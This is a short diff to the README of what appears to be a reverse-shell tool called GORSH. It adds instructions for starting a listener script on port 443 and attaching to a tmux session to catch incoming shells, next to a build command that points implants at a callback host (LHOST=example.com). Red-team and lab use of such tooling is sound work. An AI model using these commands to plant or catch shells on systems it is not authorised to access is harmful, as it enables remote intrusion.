@@ -66,6 +66,15 @@ $ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
 ## Catching the shell
 
 The `local/start.sh` kicks off a tmux session and creates new windows on every new connection.
+Feed it a port number to listen on and an `&` to send it to the background, if you'd like. 
+
+```sh
+cd local
+./start.sh 443 &
+
+# once a client connects
+tmux attach -t GORSH
+```
 
 Shells can also be caught with:
 
